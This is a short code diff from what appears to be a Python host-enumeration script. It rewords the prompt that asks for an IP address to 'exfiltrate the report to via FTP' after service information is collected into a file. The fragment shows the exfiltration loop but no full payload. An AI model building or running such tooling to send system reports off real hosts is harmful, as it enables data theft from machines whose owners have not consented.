@@ -260,7 +260,7 @@ get_services(".\\servicesOutput.txt")
 # Upload the final output file to the exfil IP.
 while exfilBool and not validExfilIP:
     # Get the exfil IP and check if it is in a valid format.
-    exfilIP = input("Enter the IP you wish to exfiltrate the report to.\n")
+    exfilIP = input("Enter the IP you wish to exfiltrate the report to via FTP.\n")
     try:
         socket.inet_aton(exfilIP)
         validExfilIP = True
